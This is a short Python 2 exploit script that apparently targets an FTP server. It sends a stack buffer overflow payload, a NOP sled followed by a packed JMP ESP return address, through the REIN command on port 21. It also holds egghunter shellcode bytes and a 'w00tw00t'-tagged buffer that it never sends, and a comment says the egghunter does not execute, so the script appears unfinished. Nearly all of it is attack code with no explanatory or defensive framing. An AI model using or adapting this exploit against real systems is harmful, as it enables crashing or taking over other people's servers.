#!/usr/bin/python

# For some reason egghunter doesn't want to execute.

import socket
import sys
import struct
import time
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

buf = "w00tw00t"
buf += "\x90" * 10000

#w00tw00t
egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

jmpesp= struct.pack("<I", 0x77E855C2)
host = sys.argv[1]
buffer = "\x90" * 284 + jmpesp + "\xff" * 30

k = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
       k.connect((host,21))
       print bcolors.OKBLUE + "[*]" + bcolors.ENDC + " The program has successfully connected to the server."
       print bcolors.OKBLUE + "[*]" + bcolors.ENDC + " Sending our payload...this will take a minute"
except:
       print bcolors.FAIL + "[!]" + bcolors.ENDC + " The program didn't recieve a response from the target."
       sys.exit(1)

time.sleep(5)
print bcolors.OKGREEN + "[+]" + bcolors.ENDC + " Sending payload through REIN command!"
k.send("REIN %s\r\n" %buffer)

k.close()
